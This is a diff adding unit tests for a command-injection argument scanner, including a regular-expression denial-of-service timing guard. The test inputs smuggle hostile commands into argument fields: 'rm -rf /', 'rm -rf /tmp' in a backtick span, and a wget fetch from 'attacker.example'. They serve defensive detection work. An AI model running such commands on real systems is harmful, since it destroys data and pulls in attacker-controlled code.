@@ -54,4 +54,20 @@ describe("command-injection argument scanning", () => {
     expect(checkCommandInjection({ count: 5, enabled: true })).toHaveLength(0);
     expect(checkCommandInjection(undefined)).toHaveLength(0);
   });
+
+  it("flags a path-qualified binary after a separator (M8)", () => {
+    expect(checkCommandInjection({ x: "report.pdf; /bin/rm -rf /" }).length).toBeGreaterThan(0);
+    expect(
+      checkCommandInjection({ x: "ok && /usr/bin/wget http://attacker.example/x" }).length,
+    ).toBeGreaterThan(0);
+  });
+
+  it("flags a verb in an unterminated backtick span and stays fast on hostile input (H6 ReDoS guard)", () => {
+    expect(checkCommandInjection({ q: "prefix `rm -rf /tmp" }).length).toBeGreaterThan(0);
+    // One backtick, many verbs, no closing backtick — the pre-fix O(n^2) pathological case.
+    const hostile = "`" + "rm ".repeat(100_000);
+    const start = Date.now();
+    checkCommandInjection({ q: hostile });
+    expect(Date.now() - start).toBeLessThan(2000);
+  });
 });
